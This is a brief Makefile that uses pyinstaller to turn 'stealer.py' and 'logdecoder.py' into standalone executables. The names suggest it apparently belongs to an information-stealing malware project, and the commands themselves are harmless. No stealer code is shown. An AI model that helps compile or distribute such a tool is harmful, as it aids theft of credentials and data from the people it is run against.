buildall : 
	make stealer
	make logdecoder
	make clean
	echo Build Completed
	pause
stealer :
	pyinstaller stealer.py --onefile
logdecoder :
	pyinstaller logdecoder.py --onefile
clean :
	rmdir build /s